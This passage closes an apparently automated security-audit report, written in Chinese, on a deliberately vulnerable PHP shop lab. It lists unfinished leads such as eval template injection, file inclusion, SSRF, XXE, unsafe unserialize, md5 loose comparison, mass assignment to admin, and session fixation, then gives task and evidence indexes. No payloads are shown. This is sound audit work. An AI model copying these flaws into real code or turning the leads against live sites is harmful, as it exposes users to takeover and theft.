- `dir_581e7a2aa4b4a52698dee0ff8773b7f2`：orders/detail.php:2 按 $_GET['id'] 查询订单未校验 user_id 归属，需确认 IDOR 与 private_note/username 泄露可达性
- `dir_ac2f249644d8108e1dd9e997496b6a95`：account/backup.php:5 unserialize 反序列化 $_POST['backup']，需检查 MemberBackup 类是否含可利用魔术方法
- `dir_b95ea999da1641d859eadd30fb91484c`：account/update.php:4-6 批量赋值 role/balance/tier 敏感列，需给出篡改余额与提权为 admin 的利用步骤
- `dir_d30384ab19d99f0bdf12989e17b70b26`：account/redeem.php:5 md5 弱类型比较 == 可绕过兑换金卡，需确认攻击载荷
- `dir_2ee3e4f3e798543ed6395793c4dc95b2`：lab30-shop/app/public/auth/logout.php 会话销毁与 CSRF/重定向参数审计（本次未读取）
- `dir_30b38d4bac309445967e4ada5b681059`：lab30-shop/app/public/ops/xml-import.php:3 simplexml_load_string 启用 LIBXML_NOENT&#124;LIBXML_DTDLOAD，XXE 待补证
- `dir_39311cbb1618e232d39dd66309d8e862`：lab30-shop/app/public/ops/formula.php:3 以 GET func 作为函数名动态调用（如 system/phpinfo）
- `dir_5118407668344f3ba4ee1cd2f83e6972`：lab30-shop/app/public/ops/maintenance.php:3 仅凭可伪造 X-Admin 头鉴权且未要求登录
- `dir_b0d264d96a486984239fb6c8d6799cd1`：lab30-shop/app/public/ops/template-preview.php:3 直接 include GET 可控 $template，评估 LFI/RFI（依赖 allow_url_include）
- `dir_d2e45720a3ccff591aa0a9e9f7b05763`：lab30-shop/app/public/ops/url-preview.php:3 file_get_contents 读取 GET url，SSRF 待补证
- `dir_daa43a017fe0ef5b676f46a0a1a1d31f`：lab30-shop/app/public/ops/template-render.php:3 对 POST template 的 {{...}} 直接 eval('return '.$m[1].';')，需补证代码执行
- `dir_a3da0a1633be563885932cc1275e43eb`：lab30-shop/app/public/content/page.php:2-3 - $_GET['page'] 直接拼入 include APP_ROOT.'/resources/views/'.$name.'.php'，无白名单/过滤，疑似本地文件包含（可配合 ../ 或 preg 无效时读取任意 PHP），需确认是否能包含非 .php 文件及实际可利用路径。
- `dir_e4c69f84250cd996a5d78750cb64fb46`：lab30-shop/app/public/catalog/greeting.php:2-3 - $_GET['name'] 未经 h() 直接 echo 到 '<h2>你好，'.$name.'</h2>'，反射型 XSS，可作为独立 finding 提交。
- `dir_7069ebffdfa851061cd31731eb56679c`：lab30-shop/app/public/account/backup.php 与 account/redeem.php 的资金/权益变更是否存在越权或重放
- `dir_fdbac731460403b4005681d9ccdd1bad`：lab30-shop/app/public/ops/index.php 角色校验是否可比绕过
- `dir_887f46cffcf32f6aa93585922fbcaa64`：审查 php.ini 未设 open_basedir 对其它 include/文件读写点（如 report.php、jobs.php）的放大作用。
- `dir_adc36fd1cd1799deed2ab27088538113`：复核 lab30-shop/app/src/bootstrap.php:13-17 中 session.use_strict_mode=0 与可传入第 ?sid 固定会话对登录流程的影响（需读取认证文件）。

**限制**

- 受阻、未执行、未读取的方向均不代表安全。

## 7. 附录与证据索引

**撤回、重复或替代记录**

- `4c55def3684b4d94be50a6917baa4d49`（revision 1）：duplicate——auth/login.php 接受 sid 参数指定会话 ID，登录后可被会话固定劫持
- `4fa11a9739ea4a898a56a85827677471`（revision 1）：duplicate——auth/continue.php 的 next 参数直接用于 Location 头导致开放重定向
- `273559dff3794cb684377c2d37822ec3`（revision 1）：duplicate——account/update.php 批量赋值：白名单含 role/balance/tier，普通用户可提权 admin 并篡改余额
- `dfb15bf1a91744c6b96f71832aab9810`（revision 1）：duplicate——ops/template-render.php 将模板 {{...}} 表达式直接传入 eval 造成代码执行
- `fc3937df4046456fac1432546795d6b2`（revision 1）：duplicate——ops/template-preview.php 将 GET template 未经白名单直接 include 造成本地文件包含
- `6f33bafffc2d49e991505ebdd782e970`（revision 1）：duplicate——partner/portal.php 仅解码 JWT payload 不校验签名，任意人构造 role=admin 令牌即可读取全部订单结算数据
- `a77553a6251c4c02b51350b220644d5b`（revision 1）：duplicate——account/redeem.php 用 == 比较 md5 兑换码，0e 型串绕过免费升级金卡

**任务记录**

| 任务 | 标题 | 状态 | 错误 |
|---|---|---|---|
| `08b15a13fb4941c3937bce416647ed5d` | 入口路由、会话与鉴权边界排查 | completed | — |
| `d7082ebb528842d581c83020114d18f1` | 数据库访问层与 SQL 拼接排查 | completed | — |
| `00c9b5a236224605bde3b6461014677c` | 账户更新批量赋值与角色/余额篡改 | completed | — |
| `13b0116d345d43bcabb43cb67606f24b` | ops 模板渲染代码执行与模板包含风险取证 | completed | — |
| `4038130bc7ee41fb8dfe65584d03dca6` | 输出渲染与 XSS/开放重定向排查 | completed | — |
| `b08ad4f2b4974e2eaf2faa0e183c562b` | 模板渲染 eval 与模板预览 LFI 补证 | completed | — |
| `8690e6e6d46b496389d296b415352d0c` | 备份/文件操作与路径遍历排查 | completed | — |
| `7383e029bf3d475d89f12f4425070553` | 会话固定与认证边界复核 | completed | — |
| `e274c1a0aad44d2ebcc1f4d60c234240` | account 模块鉴权与对象归属/输入取证 | completed | — |
| `b0c2d652c5f84fa1ad1842b0b6bd244d` | 订单、钱包与券码业务逻辑缺陷排查 | completed | — |
| `60d0071816324fa3bd5d0ce03ad7e93b` | 运营 URL 预览 SSRF 与 XML 导入 XXE | completed | — |
| `9d7995914fe54919a7048e6097e5c672` | 认证入口开放重定向与会话固定边界复核 | completed | — |
| `a2725a678f6e4efb801fd88627d80ee5` | 兑换码哈希形态与 backup unserialize gadget 链补充取证 | completed | — |
| `8cc43f721f094f6b9901c122f867bf50` | 运维入口与 CLI 脚本风险排查 | completed | — |
| `41084509fb894d11adebfc697091d5ac` | 订单创建/详情/列表的越权与业务逻辑审计 | completed | — |
| `7cf28ee4d3ab4d599314e08e771d6bde` | 合作方门户、内容页与支持下载的风险排查 | completed | — |
| `7a88b8c35b4f44918d4bef1f618f4d91` | 钱包与合作方门户资金流越权复核 | completed | — |
| `80a196d6d7fa44e4a43890dd1b9aa7bd` | PHP 运行时配置与测试夹具服务的安全影响复核 | completed | — |
| `0abcc0d6112c4cd586c2a3ea0eb9d628` | 首页入口与前端资产覆盖复核 | completed | — |

- 用量：上限 响应 2048；工具 16384；秒 10800；实际 响应 254；工具 270；秒 2832.069；剩余 响应 1794；工具 16114；秒 7967.9310000000005

**证据索引（服务器读取）**

| evidence_id | 路径 | 范围 | 文件哈希 | 可用 |
|---|---|---|---|---|
| `aecff877ea34a4a4` | lab30-shop/app/public/account/update.php | 1-9 | `b8227f19c05d0cd3` | 是 |
| `78224482780bf94a` | lab30-shop/app/src/bootstrap.php | 33-37 | `2050819d093be02b` | 是 |
| `6700e4b97da566f5` | lab30-shop/app/src/bootstrap.php | 53-53 | `2050819d093be02b` | 是 |
| `5d596a817dad3c10` | lab30-shop/app/public/ops/template-preview.php | 1-3 | `107da46e9b067ce0` | 是 |
| `38c5cad78d49b7f3` | lab30-shop/docker/php.ini | 1-13 | `b65de9007c7f42b3` | 是 |
| `6d302fb291c9a00a` | lab30-shop/fixtures/server.py | 16-17 | `730d9ef6e70ca6c6` | 是 |
| `343d5e3158080141` | lab30-shop/app/public/partner/portal.php | 2-6 | `e1267edb0f9df936` | 是 |
| `ab54a1f06e186428` | lab30-shop/app/public/partner/token.php | 4-4 | `391948b46efce76c` | 是 |
| `5220b9ce518719f6` | lab30-shop/app/src/bootstrap.php | 10-10 | `2050819d093be02b` | 是 |
| `6220461f4c36cb1a` | lab30-shop/app/src/bootstrap.php | 33-36 | `2050819d093be02b` | 是 |
| `2ba1a6f9578aa5c7` | lab30-shop/app/public/support/messages.php | 2-5 | `a6866f07b4de32f3` | 是 |
| `b06ddb554b7c114a` | lab30-shop/app/public/catalog/greeting.php | 1-3 | `8e6db315fdfc32cf` | 是 |
| `f15ec397a921596f` | lab30-shop/app/public/account/backup.php | 2-6 | `017e1703cdf0ff0c` | 是 |
| `9d0d13b19a80b9a2` | lab30-shop/app/src/backup.php | 2-5 | `571459cc8b0f6e8e` | 是 |
| `22402245fecc9056` | lab30-shop/app/public/wallet/withdraw.php | 1-11 | `e3e73271e379b085` | 是 |
| `171ea369e07c383b` | lab30-shop/app/public/orders/detail.php | 1-4 | `be69aa78cecffcfd` | 是 |
| `490c7d72eb514d6b` | lab30-shop/app/public/orders/index.php | 2-2 | `633f73e04b427bba` | 是 |
| `3d07985381125c49` | lab30-shop/app/public/auth/continue.php | 1-4 | `50fde4a15e52af44` | 是 |
| `0665b79989f38035` | lab30-shop/app/public/orders/create.php | 1-7 | `41e73625d7e04c58` | 是 |
| `173f24f6297d9164` | lab30-shop/app/public/content/page.php | 1-3 | `53c5997117f2d54c` | 是 |
| `667c91ac7c21aa66` | lab30-shop/app/public/ops/report.php | 2-3 | `90d7d60d44815374` | 是 |
| `ec18381d7af73d0f` | lab30-shop/app/public/account/update.php | 4-6 | `b8227f19c05d0cd3` | 是 |
| `85b2e45ff4e8d0eb` | lab30-shop/app/src/bootstrap.php | 4-8 | `2050819d093be02b` | 是 |
| `c7321e7900aae64d` | lab30-shop/app/public/ops/xml-import.php | 2-4 | `3c23a76b1047f734` | 是 |
| `4eba9252f833f919` | lab30-shop/app/src/bootstrap.php | 38-40 | `2050819d093be02b` | 是 |
| `368b0f4121e7e402` | lab30-shop/app/public/auth/login.php | 3-3 | `b9be43ddb2233156` | 是 |
| `61badbb513a28357` | lab30-shop/app/public/auth/login.php | 7-8 | `b9be43ddb2233156` | 是 |
| `f9d2260d0bc587cf` | lab30-shop/app/src/bootstrap.php | 13-13 | `2050819d093be02b` | 是 |
| `d65d3e90c1e93168` | lab30-shop/app/src/bootstrap.php | 17-18 | `2050819d093be02b` | 是 |
| `4d94f1acccb7284b` | lab30-shop/app/public/account/profile.php | 1-3 | `6f2406bbf636de04` | 是 |
| `ae2713ba84d306b9` | lab30-shop/app/src/bootstrap.php | 47-60 | `2050819d093be02b` | 是 |
| `906cb4c8c458a208` | lab30-shop/app/public/ops/jobs.php | 1-5 | `0f7550fa7f16bd4a` | 是 |
| `4a4dd3de59c1de26` | lab30-shop/app/src/dispatch_job.php | 1-5 | `e8234b971fe75d85` | 是 |
| `063c928d2d7c3b2e` | lab30-shop/app/src/bootstrap.php | 33-40 | `2050819d093be02b` | 是 |
| `10c0c8123072e718` | lab30-shop/app/public/support/download.php | 2-3 | `71f0558eeb4ebb6c` | 是 |
| `f5faf41dff9a5a91` | lab30-shop/app/src/bootstrap.php | 9-9 | `2050819d093be02b` | 是 |
| `9af2d828eb658d25` | lab30-shop/app/public/catalog/index.php | 3-4 | `e85bd1c2fa6a4b78` | 是 |
| `61f200eb89320676` | lab30-shop/app/public/ops/ping.php | 1-3 | `c15517950afe0794` | 是 |
| `a41ee4811beeaf1b` | lab30-shop/app/public/ops/batch-check.php | 1-3 | `5f76332e7ad1b33a` | 是 |
| `65fc5323ae7c9b98` | lab30-shop/app/src/host_check.php | 1-2 | `c3a868155c2d335e` | 是 |
| `49cfe6a3eb14f7dd` | lab30-shop/app/public/ops/index.php | 1-3 | `3e08442a501932a5` | 是 |
| `136d02a92a08ac98` | lab30-shop/app/public/ops/template-render.php | 1-4 | `357da9e9959275d8` | 是 |
| `17e1cacfb5189678` | lab30-shop/app/public/ops/url-preview.php | 2-4 | `e495938b10c455c6` | 是 |
| `80ea2098674d64d9` | lab30-shop/app/public/account/redeem.php | 2-6 | `28b3dc4534cca985` | 是 |

**附件与机器可读清单**

- Markdown：本报告（由事实包确定性生成）。
- JSON：result.json（含本事实包与质量结果）
- 证据包：evidence/（POC 脚本、runner 产物、runner manifest）
- 源码：源码片段由宿主从冻结快照读取，见 source_evidence
- 事实包 ID：`1c48ce503c8af9140bbce4025b742bbbf27145e02ea80606fa636813f97ff940`；页面、Markdown、JSON 与证据包共用同一份事实。
